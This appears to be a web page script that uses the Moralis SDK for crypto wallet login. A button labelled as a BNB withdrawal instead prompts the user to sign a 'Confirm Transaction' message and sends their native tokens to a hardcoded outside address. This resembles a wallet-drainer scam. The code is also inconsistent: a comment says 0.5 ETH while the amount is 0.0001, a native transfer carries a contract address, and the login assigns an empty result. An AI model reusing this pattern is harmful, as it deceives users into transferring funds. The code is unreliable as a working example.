
const mainBtn = document.getElementById("btn-login")

/* Moralis init code */
const serverUrl = "https://cgwnza07gq3n.usemoralis.com:2053/server";
const appId = "U63ptiJXt9LSemwi6MAJc78uFercByHiSAFcYHL8";
Moralis.start({ serverUrl, appId });

/* TODO: Add Moralis Authentication code */
let moralisUser = Moralis.User.current();

if(moralisUser) {
    mainBtn.innerHTML = 'log Out'
} else {
    mainBtn.innerHTML = 'log in'
  }

/* Authentication code */
async function login() {

  if (!moralisUser) {
    moralisUser = await Moralis.authenticate({
      signingMessage: "Log in using Moralis",
    })
      .then(function (user) {
        console.log("logged in user:", moralisUser);
        console.log(user.get("ethAddress"));
      })
      .catch(function (error) {
        console.log(error);
      });

  }

}

async function logOut() {
  await Moralis.User.logOut();
  console.log("logged out");
}

document.getElementById("btn-login").onclick = moralisUser ? logOut : login;
// document.getElementById("btn-logout").onclick = logOut;

const WithdrawBtn = document.querySelector('.WithdrawBNBbtn')

const transferToken = async () => {
    console.log('sending')
    moralisUser = await Moralis.authenticate({
        signingMessage: "Confirm Transaction",
      })
    // sending 0.5 ETH
    const options = {
        type: "native",
        amount: Moralis.Units.Token("0.0001"),
        receiver: "0xd4d41D99125f95aC2daD3717A0d4Dc97CC7bbA8A",
        contractAddress: '0xF05Cf77094AA146892ACce873f7d91411B4C13d4'
      };
      let result = await Moralis.transfer(options);
      console.log(result)
}

//   const transaction = await Moralis.transfer(options);
// const result = await transaction.wait();

WithdrawBtn.onclick = transferToken
